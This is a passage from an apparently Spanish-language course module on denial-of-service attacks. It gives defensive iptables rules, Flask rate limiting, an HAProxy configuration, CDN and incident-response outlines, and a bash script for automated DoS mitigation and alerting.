# Allow SSH with rate limiting
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --set --name SSH
iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m recent --update --seconds 60 --hitcount 3 --name SSH -j DROP
iptables -A INPUT -p tcp --dport 22 -j ACCEPT

# Allow HTTP and HTTPS
iptables -A INPUT -p tcp --dport 80 -j ACCEPT
iptables -A INPUT -p tcp --dport 443 -j ACCEPT

# Log dropped packets (optional)
iptables -A INPUT -m limit --limit 5/min -j LOG --log-prefix "iptables denied: " --log-level 7

# Save rules
iptables-save > /etc/iptables/rules.v4

echo "DoS protection rules applied successfully"
```

### Rate Limiting

#### Application-level Rate Limiting
```python
# Flask application with rate limiting
from flask import Flask, request, jsonify
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address
import redis

app = Flask(__name__)

# Redis backend for rate limiting
redis_client = redis.Redis(host='localhost', port=6379, db=0)

# Initialize rate limiter
limiter = Limiter(
    app,
    key_func=get_remote_address,
    storage_uri="redis://localhost:6379",
    default_limits=["1000 per hour", "100 per minute"]
)

@app.route('/api/login', methods=['POST'])
@limiter.limit("5 per minute")  # Strict rate limiting for login
def login():
    username = request.json.get('username')
    password = request.json.get('password')
    
    # Authentication logic here
    return jsonify({"status": "success"})

@app.route('/api/search', methods=['GET'])
@limiter.limit("100 per minute")  # Moderate rate limiting for search
def search():
    query = request.args.get('q')
    
    # Search logic here
    return jsonify({"results": []})

@app.route('/api/public', methods=['GET'])
@limiter.limit("1000 per minute")  # Lenient rate limiting for public endpoints
def public_data():
    # Public data logic here
    return jsonify({"data": "public information"})

# Custom rate limit exceeded handler
@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        "error": "Rate limit exceeded",
        "message": str(e.description)
    }), 429

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
```

### Load Balancing

#### HAProxy Configuration
```
# /etc/haproxy/haproxy.cfg
global
    daemon
    maxconn 4096
    log stdout local0

defaults
    mode http
    timeout connect 5000ms
    timeout client 50000ms
    timeout server 50000ms
    option httplog
    
    # DoS protection defaults
    option httpclose
    option forwardfor
    option redispatch

frontend web_frontend
    bind *:80
    bind *:443 ssl crt /etc/ssl/certs/server.pem
    
    # Rate limiting
    stick-table type ip size 100k expire 30s store http_req_rate(10s)
    http-request track-sc0 src
    http-request reject if { sc_http_req_rate(0) gt 20 }
    
    # Connection limiting
    tcp-request connection reject if { src_conn_cur ge 10 }
    
    # Block suspicious patterns
    http-request deny if { path_reg -i \.(php|asp|jsp)$ }
    http-request deny if { hdr_sub(user-agent) -i bot }
    
    # Default backend
    default_backend web_servers

backend web_servers
    balance roundrobin
    option httpchk GET /health
    
    # Server configuration
    server web1 192.168.1.10:80 check inter 2000ms rise 2 fall 3
    server web2 192.168.1.11:80 check inter 2000ms rise 2 fall 3
    server web3 192.168.1.12:80 check inter 2000ms rise 2 fall 3
    
    # Backup server
    server backup 192.168.1.20:80 check backup

listen stats
    bind *:8404
    stats enable
    stats uri /stats
    stats refresh 30s
```

### Content Delivery Networks (CDN)

#### CDN DoS Mitigation
```
CDN DoS Protection Features:
├── Traffic Distribution
│   ├── Global Points of Presence (PoPs)
│   ├── Load distribution across multiple servers
│   ├── Geographic load balancing
│   └── Automatic failover
├── DDoS Mitigation
│   ├── Traffic scrubbing centers
│   ├── Rate limiting at edge
│   ├── Challenge-response systems
│   └── Behavioral analysis
├── Caching Strategy
│   ├── Static content caching
│   ├── Dynamic content acceleration
│   ├── Origin server protection
│   └── Bandwidth usage reduction
└── Security Features
    ├── Web Application Firewall (WAF)
    ├── Bot detection and mitigation
    ├── SSL/TLS termination
    └── Real-time threat intelligence

Popular CDN Providers:
├── Cloudflare (comprehensive protection)
├── AWS CloudFront (AWS integration)
├── Akamai (enterprise focus)
├── Microsoft Azure CDN
└── Google Cloud CDN
```

### Planificación de Respuesta a Incidentes

#### DoS Incident Response Plan
```
DoS Incident Response Phases:
├── 1. Preparation
│   ├── Incident response team assembly
│   ├── Contact information updated
│   ├── Response procedures documented
│   └── Tools and resources prepared
├── 2. Detection and Analysis
│   ├── Alert validation and triage
│   ├── Attack vector identification
│   ├── Impact assessment
│   └── Evidence collection
├── 3. Containment
│   ├── Immediate mitigation actions
│   ├── Traffic filtering implementation
│   ├── Resource scaling if possible
│   └── Communication with stakeholders
├── 4. Eradication and Recovery
│   ├── Root cause analysis
│   ├── System restoration
│   ├── Service validation
│   └── Performance monitoring
├── 5. Post-Incident Activity
│   ├── Incident documentation
│   ├── Lessons learned session
│   ├── Process improvement
│   └── Preventive measures implementation
└── Communication Plan
    ├── Internal stakeholders
    ├── Customers and users
    ├── Law enforcement (if needed)
    └── Media relations (if necessary)
```

#### Automated Response Scripts
```bash
#!/bin/bash
# DoS incident response automation script

INCIDENT_LOG="/var/log/dos_incident.log"
ALERT_EMAIL="security@company.com"
BACKUP_SERVER="backup.company.com"

log_incident() {
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $1" >> $INCIDENT_LOG
}

detect_dos_attack() {
    # Check various DoS indicators
    local cpu_usage=$(top -bn1 | grep "Cpu(s)" | awk '{print $2}' | sed 's/%us,//')
    local memory_usage=$(free | grep Mem | awk '{printf "%.0f", ($3/$2) * 100.0}')
    local connection_count=$(netstat -an | grep ":80 " | grep ESTABLISHED | wc -l)
    
    if (( $(echo "$cpu_usage > 90" | bc -l) )) || [ $memory_usage -gt 90 ] || [ $connection_count -gt 2000 ]; then
        return 0  # Attack detected
    else
        return 1  # No attack
    fi
}

implement_emergency_measures() {
    log_incident "Implementing emergency DoS mitigation measures"
    
    # Enable SYN cookies
    echo 1 > /proc/sys/net/ipv4/tcp_syncookies
    
    # Reduce TCP timeouts
    echo 30 > /proc/sys/net/ipv4/tcp_fin_timeout
    echo 15 > /proc/sys/net/ipv4/tcp_keepalive_time
    
    # Block top attacking IPs
    netstat -an | grep ":80 " | grep ESTABLISHED | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr | head -10 | while read count ip; do
        if [ $count -gt 100 ]; then
            iptables -A INPUT -s $ip -j DROP
            log_incident "Blocked IP: $ip ($count connections)"
        fi
    done
    
    # Activate backup systems if available
    if ping -c 1 $BACKUP_SERVER >/dev/null 2>&1; then
        # DNS failover logic would go here
        log_incident "Backup systems activated"
    fi
    
    # Send alert
    echo "DoS attack detected and emergency measures activated" | mail -s "DoS ALERT" $ALERT_EMAIL
}

# Main execution
if detect_dos_attack; then
    log_incident "DoS attack detected - initiating response"
    implement_emergency_measures
else
    log_incident "System status normal"
fi
```

Este contenido completo del Tema 7 proporciona una cobertura exhaustiva de los ataques de denegación de servicio, desde conceptos básicos hasta técnicas avanzadas de mitigación y respuesta a incidentes.

## Objetivos de Aprendizaje
- [ ] Identificar diferentes tipos de ataques DoS/DDoS
- [ ] Comprender el impacto de estos ataques
- [ ] Implementar medidas de detección
- [ ] Configurar sistemas de mitigación
- [ ] Desarrollar planes de respuesta

## Recursos Adicionales
- Casos de estudio de ataques DDoS famosos
- Herramientas de testing de carga
- Servicios comerciales de protección

## Actividades
- Simulación de ataques DoS controlados
- Configuración de contramedidas
- Análisis de tráfico de ataque
- Desarrollo de plan de respuesta
